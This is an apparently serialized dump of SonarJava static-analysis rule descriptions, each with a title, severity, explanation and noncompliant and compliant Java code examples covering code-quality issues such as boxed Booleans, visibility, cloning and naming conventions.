javaS54118Boxed "Boolean" should be avoided in boolean expressions"MINOR*java:°<p>When boxed type <code>java.lang.Boolean</code> is used as an expression it will throw <code>NullPointerException</code> if the value is
<code>null</code> as defined in <a href="https://docs.oracle.com/javase/specs/jls/se8/html/jls-5.html#jls-5.1.8">Java Language Specification ¬ß5.1.8
Unboxing Conversion</a>.</p>
<p>It is safer to avoid such conversion altogether and handle the <code>null</code> value explicitly.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Boolean b = getBoolean();
if (b) {  // Noncompliant, it will throw NPE when b == null
  foo();
} else {
  bar();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
Boolean b = getBoolean();
if (Boolean.TRUE.equals(b)) {
  foo();
} else {
  bar();  // will be invoked for both b == false and b == null
}
</pre>
<h2>See</h2>
<p> * <a href="https://docs.oracle.com/javase/specs/jls/se8/html/jls-5.html#jls-5.1.8">Java Language Specification ¬ß5.1.8 Unboxing Conversion</a></p>Z
CODE_SMELL
Í

java:S2140€
javaS2140eMethods of "Random" that return floating point values should not be used in random integer generation"MINOR*java:À<p>There is no need to multiply the output of <code>Random</code>'s <code>nextDouble</code> method to get a random integer. Use the
<code>nextInt</code> method instead.</p>
<p>This rule raises an issue when the return value of any of <code>Random</code>'s methods that return a floating point value is converted to an
integer.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Random r = new Random();
int rand = (int)r.nextDouble() * 50;  // Noncompliant way to get a pseudo-random value between 0 and 50
int rand2 = (int)r.nextFloat(); // Noncompliant; will always be 0;
</pre>
<h2>Compliant Solution</h2>
<pre>
Random r = new Random();
int rand = r.nextInt(50);  // returns pseudo-random value between 0 and 50
</pre>Z
CODE_SMELL
¢

java:S4682ì
javaS4682D"@CheckForNull" or "@Nullable" should not be used on primitive types"MINOR*java:§<p>By definition, primitive types are not Objects and so they can't be <code>null</code>. Adding <code>@CheckForNull</code> or <code>@Nullable</code>
on primitive types adds confusion and is useless.</p>
<p>This rule raises an issue when <code>@CheckForNull</code> or <code>@Nullable</code> is set on a method returning a primitive type: byte, short,
int, long, float, double, boolean, char.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@CheckForNull
boolean isFoo() {
 ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
boolean isFoo() {
 ...
}
</pre>Z
CODE_SMELL
„

java:S1170‘
javaS1170jPublic constants and fields initialized at declaration should be "static final" rather than merely "final""MINOR*java:ø
<p>Making a <code>public</code> constant just <code>final</code> as opposed to <code>static final</code> leads to duplicating its value for every
instance of the class, uselessly increasing the amount of memory required to execute the application.</p>
<p>Further, when a non-<code>public</code>, <code>final</code> field isn't also <code>static</code>, it implies that different instances can have
different values. However, initializing a non-<code>static final</code> field in its declaration forces every instance to have the same value. So such
fields should either be made <code>static</code> or initialized in the constructor.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Myclass {
  public final int THRESHOLD = 3;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Myclass {
  public static final int THRESHOLD = 3;    // Compliant
}
</pre>
<h2>Exceptions</h2>
<p>No issues are reported on final fields of inner classes whose type is not a primitive or a String. Indeed according to the Java specification:</p>
<blockquote>
  <p>An inner class is a nested class that is not explicitly or implicitly declared static. Inner classes may not declare static initializers (¬ß8.7)
  or member interfaces. Inner classes may not declare static members, unless they are compile-time constant fields (¬ß15.28).</p>
</blockquote>Z
CODE_SMELL
◊

java:S2039»
javaS2039.Member variable visibility should be specified"MINOR*java:Ï<p>Failing to explicitly declare the visibility of a member variable could result it in having a visibility you don't expect, and potentially leave it
open to unexpected modification by other classes. </p>
<h2>Noncompliant Code Example</h2>
<pre>
class Ball {
    String color="red";  // Noncompliant
}
enum A {
  B;
  int a;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Ball {
    private String color="red";  // Compliant
}
enum A {
  B;
  private int a;
}
</pre>
<h2>Exceptions</h2>
<p>Members annotated with Guava's <code>@VisibleForTesting</code> annotation are ignored, as it indicates that visibility has been purposely relaxed
to make the code testable.</p>
<pre>
class Cone {
  @VisibleForTesting
  Logger logger; // Compliant
}
</pre>ZVULNERABILITY
«

java:S2156∏
javaS21563"final" classes should not have "protected" members"MINOR*java:⁄
<p>The difference between <code>private</code> and <code>protected</code> visibility is that child classes can see and use <code>protected</code>
members, but they cannot see <code>private</code> ones. Since a <code>final</code> class will have no children, marking the members of a
<code>final</code> class <code>protected</code> is confusingly pointless.</p>
<p>Note that the <code>protected</code> members of a class can also be seen and used by other classes that are placed within the same package, this
could lead to accidental, unintended access to otherwise private members.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public final class MyFinalClass {

  protected String name = "Fred";  // Noncompliant
  protected void setName(String name) {  // Noncompliant
    // ...
  }
</pre>
<h2>Compliant Solution</h2>
<pre>
public final class MyFinalClass {

  private String name = "Fred";
  public void setName(String name) {
    // ...
  }
</pre>
<h2>Exceptions</h2>
<p>Members annotated with Guava's <code>@VisibleForTesting</code> annotation are ignored, as it indicates that visibility has been purposely relaxed
to make the code testable.</p>
<pre>
public final class MyFinalClass {
  @VisibleForTesting
  protected Logger logger; // Compliant

  @VisibleForTesting
  protected int calculateSomethingComplex(String input) { // Compliant
    // ...
  }
}
</pre>Z
CODE_SMELL
‘


java:S3242≈

javaS32424Method parameters should be declared with base types"MINOR*java:Ê	<p>For maximum reusability, methods should accept parameters with as little specialization as possible. So unless specific features from a child class
are required by a method, a type higher up the class hierarchy should be used instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void printSize(ArrayList&lt;Object&gt; list) {  // Collection can be used instead
    System.out.println(list.size());
}

public static void loop(List&lt;Object&gt; list) { // java.lang.Iterable can be used instead
   for (Object o : list) {
     o.toString();
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void printSize(Collection&lt;?&gt; list) {  // Collection can be used instead
    System.out.println(list.size());
}

public static void loop(Iterable&lt;?&gt; list) { // java.lang.Iterable can be used instead
   for (Object o : list) {
     o.toString();
  }
}
</pre>
<h2>Exceptions</h2>
<p>Parameters in non-public methods are not checked, because such methods are not intended to be generally reusable. <code>java.lang.String</code>
parameters are excluded, because String is immutable and can not be always substituted for more generic type. Parameters used in any other context
than method invocation or enhanced for loop are also excluded.</p>Z
CODE_SMELL
”

java:S2153ƒ
javaS21536Boxing and unboxing should not be immediately reversed"MINOR*java:Í<p>Boxing is the process of putting a primitive value into an analogous object, such as creating an <code>Integer</code> to hold an <code>int</code>
value. Unboxing is the process of retrieving the primitive value from such an object.</p>
<p>Since the original value is unchanged during boxing and unboxing, there's no point in doing either when not needed. This also applies to autoboxing
and auto-unboxing (when Java implicitly handles the primitive/object transition for you).</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void examineInt(int a) {
  //...
}

public void examineInteger(Integer a) {
  // ...
}

public void func() {
  int i = 0;
  Integer iger1 = Integer.valueOf(0);
  double d = 1.0;

  int dIntValue = new Double(d).intValue(); // Noncompliant

  examineInt(new Integer(i).intValue()); // Noncompliant; explicit box/unbox
  examineInt(Integer.valueOf(i));  // Noncompliant; boxed int will be auto-unboxed

  examineInteger(i); // Compliant; value is boxed but not then unboxed
  examineInteger(iger1.intValue()); // Noncompliant; unboxed int will be autoboxed

  Integer iger2 = new Integer(iger1); // Noncompliant; unnecessary unboxing, value can be reused
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void examineInt(int a) {
  //...
}

public void examineInteger(Integer a) {
  // ...
}

public void func() {
  int i = 0;
  Integer iger1 = Integer.valueOf(0);
  double d = 1.0;

  int dIntValue = (int) d;

  examineInt(i);

  examineInteger(i);
  examineInteger(iger1);
}
</pre>ZBUG
ù

java:S1185é
javaS1185UOverriding methods should do more than simply call the same method in the super class"MINOR*java:é<p>Overriding a method just to call the same method from the super class without performing any other actions is useless and misleading. The only time
this is justified is in <code>final</code> overriding methods, where the effect is to lock in the parent class behavior. This rule ignores such
overrides of <code>equals</code>, <code>hashCode</code> and <code>toString</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomething() {
  super.doSomething();
}

@Override
public boolean isLegal(Action action) {
  return super.isLegal(action);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@Override
public boolean isLegal(Action action) {         // Compliant - not simply forwarding the call
  return super.isLegal(new Action(/* ... */));
}

@Id
@Override
public int getId() {                            // Compliant - there is annotation different from @Override
  return super.getId();
}
</pre>Z
CODE_SMELL
∑

java:S3008®
javaS3008CStatic non-final field names should comply with a naming convention"MINOR*java:∫<p>Shared naming conventions allow teams to collaborate efficiently. This rule checks that static non-final field names match a provided regular
expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[a-z][a-zA-Z0-9]*$</code>:</p>
<pre>
public final class MyClass {
   private static String foo_bar;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {
   private static String fooBar;
}
</pre>Z
CODE_SMELL
≈

java:S2272∂
javaS2272?"Iterator.next()" methods should throw "NoSuchElementException""MINOR*java:”<p>By contract, any implementation of the <code>java.util.Iterator.next()</code> method should throw a <code>NoSuchElementException</code> exception
when the iteration has no more elements. Any other behavior when the iteration is done could lead to unexpected behavior for users of this
<code>Iterator</code>. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyIterator implements Iterator&lt;String&gt;{
  ...
  public String next(){
    if(!hasNext()){
      return null;
    }
    ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyIterator implements Iterator&lt;String&gt;{
  ...
  public String next(){
    if(!hasNext()){
      throw new NoSuchElementException();
    }
    ...
  }
}
</pre>ZBUG
“

java:S1182√
javaS1182LClasses that override "clone" should be "Cloneable" and call "super.clone()""MINOR*java:Ã<p><code>Cloneable</code> is the marker <code>Interface</code> that indicates that <code>clone()</code> may be called on an object. Overriding
<code>clone()</code> without implementing <code>Cloneable</code> can be useful if you want to control how subclasses clone themselves, but otherwise,
it's probably a mistake.</p>
<p>The usual convention for <code>Object.clone()</code> according to Oracle's Javadoc is:</p>
<ol>
  <li> <code>x.clone() != x</code> </li>
  <li> <code>x.clone().getClass() == x.getClass()</code> </li>
  <li> <code>x.clone().equals\(x\)</code> </li>
</ol>
<p>Obtaining the object that will be returned by calling <code>super.clone()</code> helps to satisfy those invariants:</p>
<ol>
  <li> <code>super.clone()</code> returns a new object instance </li>
  <li> <code>super.clone()</code> returns an object of the same type as the one <code>clone()</code> was called on </li>
  <li> <code>Object.clone()</code> performs a shallow copy of the object's state </li>
</ol>
<h2>Noncompliant Code Example</h2>
<pre>
class BaseClass {  // Noncompliant; should implement Cloneable
  @Override
  public Object clone() throws CloneNotSupportedException {    // Noncompliant; should return the super.clone() instance
    return new BaseClass();
  }
}

class DerivedClass extends BaseClass implements Cloneable {
  /* Does not override clone() */

  public void sayHello() {
    System.out.println("Hello, world!");
  }
}

class Application {
  public static void main(String[] args) throws Exception {
    DerivedClass instance = new DerivedClass();
    ((DerivedClass) instance.clone()).sayHello();              // Throws a ClassCastException because invariant #2 is violated
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class BaseClass implements Cloneable {
  @Override
  public Object clone() throws CloneNotSupportedException {    // Compliant
    return super.clone();
  }
}

class DerivedClass extends BaseClass implements Cloneable {
  /* Does not override clone() */

  public void sayHello() {
    System.out.println("Hello, world!");
  }
}

class Application {
  public static void main(String[] args) throws Exception {
    DerivedClass instance = new DerivedClass();
    ((DerivedClass) instance.clone()).sayHello();              // Displays "Hello, world!" as expected. Invariant #2 is satisfied
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/580.html">MITRE, CWE-580</a> - clone() Method Without super.clone() </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/CQHEAw">CERT, MET53-J.</a> - Ensure that the clone() method calls super.clone() </li>
</ul>Z
CODE_SMELL
í

java:S3578É
javaS35783Test methods should comply with a naming convention"MINOR*java:•<p>Shared naming conventions allow teams to collaborate efficiently. This rule raises an issue when a test method name does not match the provided
regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default value: <code>^test[A-Z][a-zA-Z0-9]*$</code></p>
<pre>
@Test
public void foo() {  // Noncompliant
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@Test
public void testFoo() {
  // ...
}
</pre>Z
CODE_SMELL
Í

java:S1158€
javaS1158VPrimitive wrappers should not be instantiated only for "toString" or "compareTo" calls"MINOR*java:⁄<p>Creating temporary primitive wrapper objects only for <code>String</code> conversion or the use of the <code>compareTo</code> method is
inefficient.</p>
<p>Instead, the static <code>toString()</code> or <code>compare</code> method of the primitive wrapper class should be used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
new Integer(myInteger).toString();  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
Integer.toString(myInteger);        // Compliant
</pre>Z
CODE_SMELL
˛

java:S1157Ô
javaS1157]Case insensitive string comparisons should be made without intermediate upper or lower casing"MINOR*java:Á<p>Using <code>toLowerCase()</code> or <code>toUpperCase()</code> to make case insensitive comparisons is inefficient because it requires the creation
of temporary, intermediate <code>String</code> objects.</p>
<h2>Noncompliant Code Example</h2>
<pre>
boolean result1 = foo.toUpperCase().equals(bar);             // Noncompliant
boolean result2 = foo.equals(bar.toUpperCase());             // Noncompliant
boolean result3 = foo.toLowerCase().equals(bar.LowerCase()); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
boolean result = foo.equalsIgnoreCase(bar);                  // Compliant
</pre>
<h2>Exceptions</h2>
<p>No issue will be raised when a locale is specified because the result could be different from "equalsIgnoreCase". (e.g.: using the Turkish
locale)</p>
<pre>
boolean result1 = foo.toUpperCase(locale).equals(bar);             // Compliant
</pre>Z
CODE_SMELL
Ñ

java:S3577ı
javaS35773Test classes should comply with a naming convention"MINOR*java:ó<p>Shared naming conventions allow teams to collaborate efficiently. This rule raises an issue when a test class name does not match the provided
regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default value: <code>^((Test|IT)[a-zA-Z0-9]+|[A-Z][a-zA-Z0-9]*(Test|IT|TestCase|ITCase))$</code></p>
<pre>
class Foo {  // Noncompliant
  @Test
  void check() {  }
}

class Bar {  // Noncompliant
  @Nested
  class PositiveCase {
    @Test
    void check() {  }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class FooTest {
  @Test
  void check() {  }
}

class BarIT {
  @Nested
  class PositiveCase {
    @Test
    void check() {  }
  }
}
</pre>Z
CODE_SMELL
ñ

java:S1155á
javaS11559Collection.isEmpty() should be used to test for emptiness"MINOR*java:£<p>Using <code>Collection.size()</code> to test for emptiness works, but using <code>Collection.isEmpty()</code> makes the code more readable and can
be more performant. The time complexity of any <code>isEmpty()</code> method implementation should be <code>O(1)</code> whereas some implementations
of <code>size()</code> can be <code>O(n)</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (myCollection.size() == 0) {  // Noncompliant
  /* ... */
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (myCollection.isEmpty()) {
  /* ... */
}
</pre>Z
CODE_SMELL
›

java:S1153Œ
javaS11533String.valueOf() should not be appended to a String"MINOR*java:<p>Appending <code>String.valueOf()</code> to a <code>String</code> decreases the code readability.</p>
<p>The argument passed to <code>String.valueOf()</code> should be directly appended instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void display(int i){
  System.out.println("Output is " + String.valueOf(i));    // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void display(int i){
  System.out.println("Output is " + i);                    // Compliant
}
</pre>Z
CODE_SMELL
ù	

java:S1165é	
javaS1165%Exception classes should be immutable"MINOR*java:æ<p>Exceptions are meant to represent the application's state at the point at which an error occurred.</p>
<p>Making all fields in an <code>Exception</code> class <code>final</code> ensures that this state:</p>
<ul>
  <li> Will be fully defined at the same time the <code>Exception</code> is instantiated. </li>
  <li> Won't be updated or corrupted by a questionable error handler. </li>
</ul>
<p>This will enable developers to quickly understand what went wrong.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyException extends Exception {

  private int status;                               // Noncompliant

  public MyException(String message) {
    super(message);
  }

  public int getStatus() {
    return status;
  }

  public void setStatus(int status) {
    this.status = status;
  }

}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyException extends Exception {

  private final int status;

  public MyException(String message, int status) {
    super(message);
    this.status = status;
  }

  public int getStatus() {
    return status;
  }

}
</pre>Z
CODE_SMELL
í
	java:S818Ñ
javaS818%Literal suffixes should be upper case"MINOR*java:µ<p>Using upper case literal suffixes removes the potential ambiguity between "1" (digit 1) and "l" (letter el) for declaring literals.</p>
<h2>Noncompliant Code Example</h2>
<pre>
long long1 = 1l; // Noncompliant
float float1 = 1.0f; // Noncompliant
double double1 = 1.0d; // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
long long1 = 1L;
float float1 = 1.0F;
double double1 = 1.0D;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/koAtAQ">CERT DCL16-C.</a> - Use "L," not "l," to indicate a long value </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/hYClBg">CERT, DCL50-J.</a> - Use visually distinct identifiers </li>
</ul>Z
CODE_SMELL
∆

java:S2250∑
javaS2250ACollection methods with O(n) performance should be used carefully"MINOR*java:À<p>The time complexity of method calls on collections is not always obvious. For instance, for most collections the <code>size()</code> method takes
constant time, but the time required to execute <code>ConcurrentLinkedQueue.size()</code> is O(n), i.e. directly proportional to the number of
elements in the collection. When the collection is large, this could therefore be an expensive operation. </p>
<p>This rule raises an issue when the following O(n) methods are called outside of constructors on class fields:</p>
<ul>
  <li> <code>ArrayList</code>
    <ul>
      <li> <code>contains</code> </li>
      <li> <code>remove</code> </li>
    </ul> </li>
  <li> <code>LinkedList</code>
    <ul>
      <li> <code>get</code> </li>
      <li> <code>contains</code> </li>
    </ul> </li>
  <li> <code>ConcurrentLinkedQueue</code>
    <ul>
      <li> <code>size</code> </li>
      <li> <code>contains</code> </li>
    </ul> </li>
  <li> <code>ConcurrentLinkedDeque</code>
    <ul>
      <li> <code>size</code> </li>
      <li> <code>contains</code> </li>
    </ul> </li>
  <li> <code>CopyOnWriteArrayList</code>
    <ul>
      <li> <code>add</code> </li>
      <li> <code>contains</code> </li>
      <li> <code>remove</code> </li>
    </ul> </li>
  <li> <code>CopyOnWriteArraySet</code>
    <ul>
      <li> <code>add</code> </li>
      <li> <code>contains</code> </li>
      <li> <code>remove</code> </li>
    </ul> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
ConcurrentLinkedQueue queue = new ConcurrentLinkedQueue();
//...
log.info("Queue contains " + queue.size() + " elements");  // Noncompliant
</pre>Z
CODE_SMELL
æ

java:S2130Ø
javaS21309Parsing should be used to convert "Strings" to primitives"MINOR*java:À<p>Rather than creating a boxed primitive from a <code>String</code> to extract the primitive value, use the relevant <code>parse</code> method
instead. It will be clearer and more efficient.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String myNum = "12.2";

float f = (new Float(myNum)).floatValue();  // Noncompliant; creates &amp; discards a Float
</pre>
<h2>Compliant Solution</h2>
<pre>
String myNum = "12.2";

float f = Float.parseFloat(myNum);
</pre>Z
CODE_SMELL
Ô

java:S4926‡
javaS49261"serialVersionUID" should not be declared blindly"MINOR*java:Ñ<p>Providing a <code>serialVersionUID</code> field on <code>Serializable</code> classes is strongly recommended by the <code>Serializable</code>
documentation but blindly following that recommendation can be harmful.</p>
<p><code>serialVersionUID</code> value is stored with the serialized data and this field is verified when deserializing the data to ensure that the
code reading the data is compatible with the serialized data. In case of failure, it means the serialized data and the code are not in sync and this
fine because you know what's wrong.</p>
<p>When the <code>serialVersionUID</code> is generated by an IDE or blindly hard-coded, there is a high probability that one will forget to update the
<code>serialVersionUID</code> value when the <code>Serializable</code> class is later enriched with additional fields. As a consequence, old
serialized data will incorrectly be considered compatible with the newer version of the code creating situations which are hard to debug.</p>
<p>Therefore, defining <code>serialVersionUID</code> should be done with care. This rule raises an issue on each <code>serialVersionUID</code> field
declared on classes implementing <code>Serializable</code> to be sure the presence and the value of the <code>serialVersionUID</code> field is
challenged and validated by the team.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo implements Serializable {
  private static final long serialVersionUID = 1;
}

public class BarException extends RuntimeException {
  private static final long serialVersionUID = 8582433437601788991L;
}
</pre>
<h2>See</h2>
<ul>
  <li> Vojtech Ruzicka's Programming Blog: <a href="https://www.vojtechruzicka.com/explicitly-declare-serialversionuid/">Should I explicitly declare
  serialVersionUID?</a> </li>
</ul>Z
CODE_SMELL
∆

java:S4929∑
javaS4929+"read(byte[],int,int)" should be overridden"MINOR*java:·<p>When directly subclassing <code>java.io.InputStream</code> or <code>java.io.FilterInputStream</code>, the only requirement is that you implement
the method <code>read()</code>. However most uses for such streams don't read a single byte at a time and the default implementation for
<code>read(byte[],int,int)</code> will call <code>read(int)</code> for every single byte in the array which can create a lot of overhead and is
utterly inefficient. It is therefore strongly recommended that subclasses provide an efficient implementation of
<code>read(byte[],int,int)</code>.</p>
<p>This rule raises an issue when a direct subclass of <code>java.io.InputStream</code> or <code>java.io.FilterInputStream</code> doesn't provide an
override of <code>read(byte[],int,int)</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyInputStream extends java.io.InputStream {
  private FileInputStream fin;

  public MyInputStream(File file) throws IOException {
    fin = new FileInputStream(file);
  }

  @Override
  public int read() throws IOException {
    return fin.read();
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyInputStream extends java.io.InputStream {
  private FileInputStream fin;

  public MyInputStream(File file) throws IOException {
    fin = new FileInputStream(file);
  }

  @Override
  public int read() throws IOException {
    return fin.read();
  }

  @Override
  public int read(byte[] b, int off, int len) throws IOException {
    return fin.read(b, off, len);
  }
}
</pre>
<h2>Exceptions</h2>
<p>This rule doesn't raise an issue when the class is declared <code>abstract</code>.</p>Z
CODE_SMELL
ó

java:S1659à
javaS1659:Multiple variables should not be declared on the same line"MINOR*java:£<p>Declaring multiple variables on one line is difficult to read.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyClass {

  private int a, b;

  public void method(){
    int c; int d;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {

  private int a;
  private int b;

  public void method(){
    int c;
    int d;
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/7wHEAw">CERT, DCL52-J.</a> - Do not declare more than one variable per declaration
  </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/VgU">CERT, DCL04-C.</a> - Do not declare more than one variable per declaration </li>
</ul>Z
CODE_SMELL
Í

java:S1301€
javaS13019"switch" statements should have at least 3 "case" clauses"MINOR*java:˜<p><code>switch</code> statements are useful when there are many different cases depending on the value of the same expression.</p>
<p>For just one or two cases however, the code will be more readable with <code>if</code> statements.</p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (variable) {
  case 0:
    doSomething();
    break;
  default:
    doSomethingElse();
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (variable == 0) {
  doSomething();
} else {
  doSomethingElse();
}
</pre>Z
CODE_SMELL
¥


java:S2637•

javaS2637+"@NonNull" values should not be set to null"MINOR*java:÷	<p>Fields, parameters and return values marked <code>@NotNull</code>, <code>@NonNull</code>, or <code>@Nonnull</code> are assumed to have non-null
values and are not typically null-checked before use. Therefore setting one of these values to <code>null</code>, or failing to set such a class field
in a constructor, could cause <code>NullPointerException</code>s at runtime.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MainClass {

  @Nonnull
  private String primary;
  private String secondary;

  public MainClass(String color) {
    if (color != null) {
      secondary = null;
    }
    primary = color;  // Noncompliant; "primary" is Nonnull but could be set to null here
  }

  public MainClass() { // Noncompliant; "primary" Nonnull" but is not initialized
  }

  @Nonnull
  public String indirectMix() {
    String mix = null;
    return mix;  // Noncompliant; return value is Nonnull, but null is returned.}}
  }
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/476.html">MITRE CWE-476</a> - NULL Pointer Dereference </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/ZwDOAQ">CERT, EXP01-J.</a> - Do not use a null in a case where an object is required
  </li>
</ul>ZBUG
 

java:S1874ª
javaS1874%"@Deprecated" code should not be used"MINOR*java:Î
<p>Once deprecated, classes, and interfaces, and their members should be avoided, rather than used, inherited or extended. Deprecation is a warning
that the class or interface has been superseded, and will eventually be removed. The deprecation period allows you to make a smooth transition away
from the aging, soon-to-be-retired technology.</p>
<h2>Noncompliant Code Example</h2>
<pre>
/**
 * @deprecated  As of release 1.3, replaced by {@link #Fee}
 */
@Deprecated
public class Fum { ... }

public class Foo {
  /**
   * @deprecated  As of release 1.7, replaced by {@link #doTheThingBetter()}
   */
  @Deprecated
  public void doTheThing() { ... }

  public void doTheThingBetter() { ... }
}

public class Bar extends Foo {
  public void doTheThing() { ... } // Noncompliant; don't override a deprecated method or explicitly mark it as @Deprecated
}

public class Bar extends Fum {  // Noncompliant; Fum is deprecated

  public void myMethod() {
    Foo foo = new Foo();  // okay; the class isn't deprecated
    foo.doTheThing();  // Noncompliant; doTheThing method is deprecated
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/477.html">MITRE, CWE-477</a> - Use of Obsolete Functions </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/KgAVAg">CERT, MET02-J.</a> - Do not use deprecated or obsolete classes or methods </li>
</ul>Z
CODE_SMELL
û

java:S1643è
javaS16436Strings should not be concatenated using '+' in a loop"MINOR*java:Æ<p>Strings are immutable objects, so concatenation doesn't simply add the new String to the end of the existing string. Instead, in each loop
iteration, the first String is converted to an intermediate object type, the second string is appended, and then the intermediate object is converted
back to a String. Further, performance of these intermediate operations degrades as the String gets longer. Therefore, the use of StringBuilder is
preferred.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String str = "";
for (int i = 0; i &lt; arrayOfStrings.length ; ++i) {
  str = str + arrayOfStrings[i];
}
</pre>
<h2>Compliant Solution</h2>
<pre>
StringBuilder bld = new StringBuilder();
  for (int i = 0; i &lt; arrayOfStrings.length; ++i) {
    bld.append(arrayOfStrings[i]);
  }
  String str = bld.toString();
</pre>Z
CODE_SMELL
 

java:S1641ª
javaS1641GSets with elements that are enum values should be replaced with EnumSet"MINOR*java:…<p>When all the elements in a Set are values from the same enum, the Set can be replaced with an EnumSet, which can be much more efficient than other
sets because the underlying data structure is a simple bitmap.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {

  public enum COLOR {
    RED, GREEN, BLUE, ORANGE;
  }

  public void doSomething() {
    Set&lt;COLOR&gt; warm = new HashSet&lt;COLOR&gt;();
    warm.add(COLOR.RED);
    warm.add(COLOR.ORANGE);
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass {

  public enum COLOR {
    RED, GREEN, BLUE, ORANGE;
  }

  public void doSomething() {
    Set&lt;COLOR&gt; warm = EnumSet.of(COLOR.RED, COLOR.ORANGE);
  }
}
</pre>Z
CODE_SMELL
ó

java:S2974à
javaS29747Classes without "public" constructors should be "final""MINOR*java:¶<p>Classes with only <code>private</code> constructors should be marked <code>final</code> to prevent any mistaken extension attempts.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class PrivateConstructorClass {  // Noncompliant
  private PrivateConstructorClass() {
    // ...
  }

  public static int magic(){
    return 42;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public final class PrivateConstructorClass {  // Compliant
  private PrivateConstructorClass() {
    // ...
  }

  public static int magic(){
    return 42;
  }
}
</pre>Z
CODE_SMELL
ø

java:S1640∞
javaS1640CMaps with keys that are enum values should be replaced with EnumMap"MINOR*java:¬<p>When all the keys of a Map are values from the same enum, the <code>Map</code> can be replaced with an <code>EnumMap</code>, which can be much more
efficient than other sets because the underlying data structure is a simple array.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {

  public enum COLOR {
    RED, GREEN, BLUE, ORANGE;
  }

  public void mapMood() {
    Map&lt;COLOR, String&gt; moodMap = new HashMap&lt;COLOR, String&gt; ();
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass {

  public enum COLOR {
    RED, GREEN, BLUE, ORANGE;
  }

  public void mapMood() {
    EnumMap&lt;COLOR, String&gt; moodMap = new EnumMap&lt;&gt; (COLOR.class);
  }
}
</pre>Z
CODE_SMELL
—

java:S2737¬
javaS2737+"catch" clauses should do more than rethrow"MINOR*java:Ï<p>A <code>catch</code> clause that only rethrows the caught exception has the same effect as omitting the <code>catch</code> altogether and letting
it bubble up automatically, but with more code and the additional detriment of leaving maintainers scratching their heads. </p>
<p>Such clauses should either be eliminated or populated with the appropriate logic.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public String readFile(File f) {
  StringBuilder sb = new StringBuilder();
  try {
    FileReader fileReader = new FileReader(fileName);
    BufferedReader bufferedReader = new BufferedReader(fileReader);

    while((line = bufferedReader.readLine()) != null) {
      //...
  }
  catch (IOException e) {  // Noncompliant
    throw e;
  }
  return sb.toString();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public String readFile(File f) {
  StringBuilder sb = new StringBuilder();
  try {
    FileReader fileReader = new FileReader(fileName);
    BufferedReader bufferedReader = new BufferedReader(fileReader);

    while((line = bufferedReader.readLine()) != null) {
      //...
  }
  catch (IOException e) {
    logger.LogError(e);
    throw e;
  }
  return sb.toString();
}
</pre>
<p>or</p>
<pre>
public String readFile(File f) throws IOException {
  StringBuilder sb = new StringBuilder();
  FileReader fileReader = new FileReader(fileName);
  BufferedReader bufferedReader = new BufferedReader(fileReader);

  while((line = bufferedReader.readLine()) != null) {
    //...

  return sb.toString();
}
